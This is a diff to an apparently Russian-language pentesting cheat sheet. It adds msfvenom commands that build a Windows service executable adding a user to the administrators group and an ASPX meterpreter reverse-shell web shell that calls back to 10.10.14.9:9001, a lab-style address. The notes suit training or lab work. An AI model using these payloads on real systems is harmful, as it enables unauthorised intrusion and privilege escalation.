@@ -55,7 +55,10 @@ session -i
 
 # Содаем исполнимый файл для виндовс
 
-msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+     msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
+
+# Создаем вебшелл на x86
+     msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform win LHOST=10.10.14.9 LPORT=9001 -f aspx > reverse.aspx
 
 # Создаем реверс шелл для виндовс
 
